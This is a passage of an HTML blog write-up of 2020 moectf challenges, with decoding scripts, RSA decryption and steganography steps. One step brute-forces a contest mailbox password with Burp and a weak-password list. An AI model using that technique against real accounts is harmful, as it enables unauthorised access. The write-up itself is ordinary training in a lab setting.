title="解题思路"></a>解题思路</h3><p>啊这</p><h3 id="解题过程-13"><a href="#解题过程-13" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> m)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">200</span>;i++)</span><br><span class="line"><span class="keyword">if</span>(<span class="number">5</span>*<span class="built_in">pow</span>(i,<span class="number">2</span>)+<span class="number">6</span>*i<span class="number">-8</span> == m)<span class="built_in">cout</span>&lt;&lt; (<span class="keyword">char</span>)i;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag[]=&#123;<span class="number">60051</span>,<span class="number">62263</span>,<span class="number">51603</span>,<span class="number">49591</span>,<span class="number">67968</span>,<span class="number">52624</span>,<span class="number">76375</span>,<span class="number">38359</span>,<span class="number">51603</span>,<span class="number">58960</span>,<span class="number">49591</span>,<span class="number">62263</span>,<span class="number">60051</span>,<span class="number">51603</span>,<span class="number">45687</span>,<span class="number">67968</span>,<span class="number">62263</span>,<span class="number">45687</span>,<span class="number">22839</span>,<span class="number">65656</span>,<span class="number">73923</span>,<span class="number">63384</span>,<span class="number">67968</span>,<span class="number">62263</span>,<span class="number">78867</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="keyword">sizeof</span>(flag);i++)solve(flag[i]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="03-ras-begin"><a href="#03-ras-begin" class="headerlink" title="03 ras_begin"></a>03 ras_begin</h2><h3 id="解题思路-15"><a href="#解题思路-15" class="headerlink" title="解题思路"></a>解题思路</h3><p>脚本</p><h3 id="解题过程-14"><a href="#解题过程-14" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">12786994906832886031173089454539830225421640443805160963440942546071910322282773910135388020414967368794768319321460372875327006020157548651622969466323905189761834455201291838045352561790791600881627927594863932384116760236609096504346833060291203939690475993692410973499329433726175351882818053841075210942250478835641657575946226612389154039920962506062857726362447590070697348315291411570674334126096132112365825105842643843896421848410966564321518660727994853036555116782763422065173850238826345797198901647320210828033061322523971939726188821545177029535860881611210887039411052848607563035583276075332653567834</span></span><br><span class="line">n = <span class="number">21295111652177049852547386222656846645616549922902112221240647622752994625687294739828756977846793220378085163155773051922086862363248151399852421844018730199066331944608000906761112010951655369036878807145188296884981895884278542857120225505310980291226351653588799242142355376939447934804833830853036785704513557039806761305316841740131204576974408869765714675230132247412774215945663807730855436503625577606009921411947891570324777735323489304604987902364932089976811865007609745513534209603256719511305317200247134396733168695387708420206468160279271453425776388025425790010391137010735121696446552257334341187063</span></span><br><span class="line">p = <span class="number">161719691876167304386300539654699854745688262478039691942271426308613132466937889105173933022986654040443219708318126579048996288583272346602042650222520127626611975688909019632479930508343350314542889627461529623000987307169157443265879212155437165660477850241678385286601587538517091605374764970915451201471</span></span><br><span class="line">q = <span class="number">131679150542057883837006988923642169851011066771905140540444762603374903776910595387305441746623070810587630852182725227845916400198693359271062585498062084740896090668288333576457754165324164735966791029516030696195703650691726650990903496820364700241229117883279657833543807874786274886417501405960125022153</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">d = invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))</span><br><span class="line">m = pow(c, d, n)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="01-Welcome"><a href="#01-Welcome" class="headerlink" title="01 Welcome"></a>01 Welcome</h2><p><img src="https://i.loli.net/2020/10/13/Lq98lKUbaIfEYjA.png" alt="image-20200922130546632.png"></p><hr><h2 id="02-MD5"><a href="#02-MD5" class="headerlink" title="02 MD5"></a>02 MD5</h2><h3 id="解题过程-15"><a href="#解题过程-15" class="headerlink" title="解题过程"></a>解题过程</h3><p><img src="https://i.loli.net/2020/10/13/oD6aXZ7SH5Ufukr.png" alt="image-20200922130720705.png"></p><p><del>这么臭的题，有必要做吗？？？</del></p><hr><h2 id="03-base64"><a href="#03-base64" class="headerlink" title="03 base64"></a>03 base64</h2><h3 id="解题过程-16"><a href="#解题过程-16" class="headerlink" title="解题过程"></a>解题过程</h3><p><img src="https://i.loli.net/2020/10/13/MiePGgKnbYd3NJF.png" alt="image-20200922130953267.png"></p><hr><h2 id="04-hey-fxck-you"><a href="#04-hey-fxck-you" class="headerlink" title="04 hey fxck you!"></a>04 hey fxck you!</h2><h3 id="解题过程-17"><a href="#解题过程-17" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>拿到图片，hex查看发现zip头</p><p><img src="https://i.loli.net/2020/10/13/Bf7zoUMrWSlYOm9.png" alt="image-20200922132548726.png"></p></li><li><p>foremost分离，解压后拿到<code>fk u.txt</code></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="title">[</span>&gt;&gt;++&gt;++<span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="literal">+</span>&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;--<span class="literal">-</span><span class="string">.</span>++<span class="string">.</span>&lt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>--<span class="string">.</span>&gt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&lt;++<span class="literal">+</span><span class="string">.</span>&gt;&gt;--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>--<span class="string">.</span>&lt;&lt;<span class="literal">-</span><span class="string">.</span>&gt;<span class="literal">-</span><span class="string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="literal">+</span><span class="string">.</span>&gt;&gt;&gt;&gt;&gt;&gt;<span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;<span class="string">.</span>&lt;&lt;&lt;&lt;&lt;<span class="string">.</span>&gt;&gt;&gt;&gt;<span class="literal">+</span><span class="string">.</span>++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>--<span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="literal">-</span><span class="string">.</span>&lt;++<span class="literal">+</span><span class="literal">+</span><span class="literal">+</span><span class="string">.</span>&gt;<span class="string">.</span>&lt;&lt;&lt;++<span class="string">.</span>&lt;<span class="string">.</span>&gt;&gt;&gt;&gt;&gt;&gt;++<span class="literal">+</span><span class="literal">+</span><span class="string">.</span></span><br></pre></td></tr></table></figure></li><li><p>brainfuck解码获得flag</p></li></ul><hr><h2 id="05-base64？¿"><a href="#05-base64？¿" class="headerlink" title="05 base64？¿"></a>05 base64？¿</h2><h3 id="解题过程-18"><a href="#解题过程-18" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>开提示，看到是个换表的base64</p><p><img src="https://i.loli.net/2020/10/13/MiePGgKnbYd3NJF.png" alt="image-20200922130953267.png"></p></li></ul><hr><h2 id="06-Puesudo-Encryption"><a href="#06-Puesudo-Encryption" class="headerlink" title="06 Puesudo Encryption"></a>06 Puesudo Encryption</h2><h3 id="解题过程-19"><a href="#解题过程-19" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>Hex查看，发现只有zip尾，缺了头。加上。</p><p><img src="https://i.loli.net/2020/10/13/iSBJ4RvzFHaDcq9.png" alt="image-20200922133749927.png"></p></li><li><p>解压后，拿到图片。<del>eqqie，tql</del></p><p><img src="https://i.loli.net/2020/10/13/ex8q52MKwuGnFAr.jpg" alt="flag.jpg"></p></li><li><p>Hex查看，文件最后有一串base64编码，解码，拿到flag</p><p><img src="https://i.loli.net/2020/10/13/MmsoHzlIUYyxcNj.png" alt="image-20200922134136368.png"></p></li></ul><hr><h2 id="07-不-会-吧-？-就-这-¿"><a href="#07-不-会-吧-？-就-这-¿" class="headerlink" title="07 不 会 吧 ？ 就 这 ¿"></a>07 不 会 吧 ？ 就 这 ¿</h2><h3 id="解题过程-20"><a href="#解题过程-20" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>Hex查看图片，发现zip头，foremost分离压缩包。解压得到txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">就这¿ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 就这¿ 就这¿ 就这¿ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 就这¿ 就这¿ 不会吧？ 就这¿ 不会吧？ 就这¿ </span><br><span class="line">不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 不会吧？ 就这¿ 就这¿ </span><br></pre></td></tr></table></figure></li><li><p>将<code>就这¿ </code>替换为0，将<code>不会吧？</code>替换为1，然后倒置，2进制转10进制，ascii码转字符，拿到flag。</p></li></ul><hr><h2 id="08-Cor1e的支票"><a href="#08-Cor1e的支票" class="headerlink" title="08 Cor1e的支票"></a>08 Cor1e的支票</h2><h3 id="解题过程-21"><a href="#解题过程-21" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">。。。。。。。。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。。。。。。。。。？。？！。？。。。。。。。。。。。。。。。。。。！。。。。。！。？。。。。。。。！？！！。？！！！！！！？。？！。？！！！。！！！！！。？。。。。。。。。。！？！！。？。。。。。。。。？。？！。？。。！。？。。。。。。。！？！！。？！！！！！！？。？！。？！！！！！！！！！！！。？。。。。。。。。。！？！！。？。。。。。。。。？。？！。？。。。。。。。。。。！。？。。。。。。。。。！？！！。？！！！！！！！！？。？！。？！！！！！！！！！！！！！！！！！。？。。。。。。。！？！！。？。。。。。。？。？！。？。。。。。。！。。。。。。。！。？。。。。。。。。。。。。。。。。。！？！！。？！！！！！！！！！！！！！！！！？。？！。？！！！。？。。。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。。。？。？！。？。。。。。。！。！！！！！！！！！！！！！。？。。。。。。。。。。。！？！！。？！！！！！！！！！！？。？！。？！！！！！！！！！！！。？。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。？。？！。？。。。。。。。。。。。。。。。。。。！。？。。。。。。。。。。。。。！？！！。？！！！！！！！！！！！！？。？！。？！！！！！！！！！！！！！。？。。。。。。。。。。。！？！！。？。。。。。。。。。。？。？！。？。。。。！。。。。。。。。。。。。。！。？。。。。。。。。。。。。。。。！？！！。？！！！！！！！！！！！！！！？。？！。？！！！。？。。。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。。。？。？！。？。。。。。。。。。。。。。。。。。。。。。。。。。。！。！！！！！！！！！！！！！！！！！。！！！！！！！！！。！！！！！！！！！！！！！。？。。。。。。。。。。。。。！？！！。？！！！！！！！！！！！！？。？！。？！！！！！！！！！！！！！！！！！！！！！。？。。。。。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。。。。。？。？！。？。。。。！。？。。。。。。。。。！？！！。？！！！！！！！！？。？！。？！！！！！！！！！。？。。。。。。。。。。。！？！！。？！！！！！！！！！！？。？！。？！！！！！！！。？。。。。。。。！？！！。？。。。。。。？。？！。？。。。。。。。。！。？。。。。。。。。。。。。。！？！！。？。。。。。。。。。。。。？。？！。？。。。。。。。。。。。。。。。。。。！。？。</span><br></pre></td></tr></table></figure><ul><li>替换：。-&gt; Ook.    ! -&gt; Ook!    ? -&gt; Ook?</li><li>在线Ook解密，得到flag</li></ul><hr><h2 id="09-A3FXCK"><a href="#09-A3FXCK" class="headerlink" title="09 A3FXCK"></a>09 A3FXCK</h2><blockquote><p><img src="https://i.loli.net/2020/09/02/soipQW3CyMEe6YF.png"></p><p>“luoq1an向arttnba3推荐了世界上最优秀的语言Javascript，但对于实在是不精通编程的他来说，这无疑是一场灾难…”</p></blockquote><h3 id="解题过程-22"><a href="#解题过程-22" class="headerlink" title="解题过程"></a>解题过程</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123456[]()+!</span><br><span class="line">luoq1an recommended a new language to arttnba3 and the following text is the first programme written by him but something may not be right...</span><br></pre></td></tr></table></figure><ul><li>先将luoqian和arttnba全部去除。在按照提示，将123456分别替换为<a href=""></a>+!</li><li>Jsfuck解码，得到flag</li></ul><hr><h2 id="10-⑨的完美教室"><a href="#10-⑨的完美教室" class="headerlink" title="10 ⑨的完美教室"></a>10 ⑨的完美教室</h2><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=751472&height=66"></iframe><h3 id="解题思路-16"><a href="#解题思路-16" class="headerlink" title="解题思路"></a>解题思路</h3><blockquote><p>1 + 1 = 9<br>2  + 3 = 9<br>0 + 0 = 9<br>arttnba3 + arttnba3 = 9<br>$e^{\pi\cdot i}=9$</p></blockquote><h3 id="解题过程-23"><a href="#解题过程-23" class="headerlink" title="解题过程"></a>解题过程</h3><p><del>手撕</del> </p><p><img src="https://i.loli.net/2020/10/13/gGex957DpkfvwcC.png" alt="image-20200922141816210.png"></p><h4 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h4><p>python pwntools脚本</p><hr><h2 id="11-停不下来了啊啊啊啊啊啊啊"><a href="#11-停不下来了啊啊啊啊啊啊啊" class="headerlink" title="11 停不下来了啊啊啊啊啊啊啊"></a>11 停不下来了啊啊啊啊啊啊啊</h2><h3 id="解题过程-24"><a href="#解题过程-24" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>FFMPEG黑场帧检测</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -loglevel info  -i ~/test.mp4  -vf blackframe=95:30 -f null -</span><br></pre></td></tr></table></figure></li><li><p>vegas跳转到对应帧，拿到flag</p></li></ul><h4 id="世界线2-1"><a href="#世界线2-1" class="headerlink" title="世界线2"></a>世界线2</h4><p>用vegas将视频的全部帧dump出来，做一张纯黑图片，查找相似图片。</p><hr><h2 id="12-星空"><a href="#12-星空" class="headerlink" title="12 星空"></a>12 星空</h2><h3 id="解题过程-25"><a href="#解题过程-25" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li>图片拼接</li></ul><p><img src="https://i.loli.net/2020/10/13/zlRDgiXyeKPprMU.png" alt="image-20200922143250005.png"></p><ul><li><p>利用gaps自动拼图。</p><p><img src="https://i.loli.net/2020/10/13/3QLFdSa5EqNorKj.png" alt="image-20200922143348356.png"></p></li></ul><hr><h2 id="13-简-单-的社工题"><a href="#13-简-单-的社工题" class="headerlink" title="13 简 单 的社工题"></a>13 简 单 的社工题</h2><blockquote><p>简单的社工尝试！你能找到隐藏的<strong>moectf</strong>的flag吗？<br>提示：百度贴吧<br>使用手机版贴吧寻找第一步的信息<br>flag格式：moectf{flag内容}</p></blockquote><h3 id="解题过程-26"><a href="#解题过程-26" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>手机版贴吧搜索moectf吧。</p><p><img src="https://i.loli.net/2020/10/13/Uid5mgWZ9D8nuR4.jpg" alt="Screenshot_2020-09-26-16-34-46-415_com.baidu.tieb.jpg"></p></li><li><p>查看关注的人，惊现arttnba小号</p><p><img src="https://i.loli.net/2020/10/13/ixnScwYKIWO8Pog.jpg" alt="Screenshot_2020-09-26-16-34-52-748_com.baidu.tieb.jpg"></p></li><li><p>查看arttnba关注的吧</p><p><img src="https://i.loli.net/2020/10/13/XeKcBk2swmN7jtS.jpg" alt="Screenshot_2020-09-26-16-34-57-959_com.baidu.tieb.jpg"></p></li><li><p>按照提示，进入公邮</p><p><img src="https://i.loli.net/2020/10/13/NZClDfpn6LFbUku.png" alt="image-20200926163820736.png"></p></li><li><p>用Burp+Top100弱口令字典爆破密码。密码是a123456</p></li><li><p>查看管理员发送的通知，一看就是百度网盘分享链接和密码。访问之。</p><p><img src="https://i.loli.net/2020/10/13/lOZfzwpF5PCrV9k.png" alt="image-20200926163943535.png"></p><ul><li>txt文件里有base64编码的flag<code>bW9lY3RmJTdCdzB3X1kwdV9jNG5fZjFuZF9tM19vdVQlMjElN0Q=</code></li></ul></li></ul><h1 id="Classical-Crypto"><a href="#Classical-Crypto" class="headerlink" title="Classical Crypto"></a>Classical Crypto</h1><h2 id="01-大帝的征程-1"><a href="#01-大帝的征程-1" class="headerlink" title="01 大帝的征程#1"></a>01 大帝的征程#1</h2><p>rot13，ord(‘z’) - ord(‘m’) = 13</p><hr><h2 id="02-大帝的征程-2"><a href="#02-大帝的征程-2" class="headerlink" title="02 大帝的征程#2"></a>02 大帝的征程#2</h2><p><strong>手撕</strong></p><p>有数字的维吉尼亚加密，table就是key</p><p>这题的坑点是。。。符号也占一位key</p><hr><h2 id="03-外面的世界"><a href="#03-外面的世界" class="headerlink" title="03 外面的世界"></a>03 外面的世界</h2><p><strong>手撕</strong></p><p>m    c    {    i    3    3    n    y    _    -    n    ~<br>o    t    R    1    n    _    c    p    1    F    N    }<br>e    f    a    F    c    3    2    T    s    u    y    </p><p>moectf{Rai1F3nc3_3nc2ypt_1s-Fuuny~}</p><hr><h2 id="04-大帝的征程-3"><a href="#04-大帝的征程-3" class="headerlink" title="04 大帝的征程#3"></a>04 大帝的征程#3</h2><p>换表凯撒加密，表里有哪些字符不(lan)好(de)猜(shi)，直接<strong>爆破</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;&gt;@64E7L4_?BF6C0E9b0)s$trN&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;moectf&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">for i in range(len(b)):</span></span><br><span class="line"><span class="string">    print(ord(b[i])-ord(a[i]), end=&#x27; &#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> a:</span><br><span class="line">        o = ord(j)+<span class="number">47</span></span><br><span class="line">        <span class="keyword">if</span> o &gt; ord(<span class="string">&#x27;&#125;&#x27;</span>):</span><br><span class="line">            print(chr(o - i), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(chr(o), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    print(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/13/cZaoyC1iNPLK4Ez.png" alt="image-20200922152504134.png"></p><hr><h2 id="05-大帝的征程-维吉尼亚"><a href="#05-大帝的征程-维吉尼亚" class="headerlink" title="05 大帝的征程#维吉尼亚"></a>05 大帝的征程#维吉尼亚</h2><p><strong>爆破</strong>猜解密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="string">&#x27;pgieqi&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;moectf&#x27;</span></span><br><span class="line">c = <span class="string">&#x27;pgieqi&#123;k0_ajxW_k-R3zq?&#125;&#x27;</span></span><br><span class="line">d = [<span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, ]</span><br><span class="line"></span><br><span class="line">table = [<span class="number">3</span>, <span class="number">-8</span>, <span class="number">4</span>, <span class="number">2</span>, <span class="number">-3</span>, ]</span><br><span class="line">count = <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(c)):</span><br><span class="line">        <span class="keyword">if</span> c[i] <span class="keyword">in</span> d:</span><br><span class="line">            print(c[i], end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            count += <span class="number">1</span></span><br><span class="line">            print(chr(ord(c[i]) - table[count % <span class="number">5</span>]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="06-大帝的征程-维吉尼亚Ex"><a 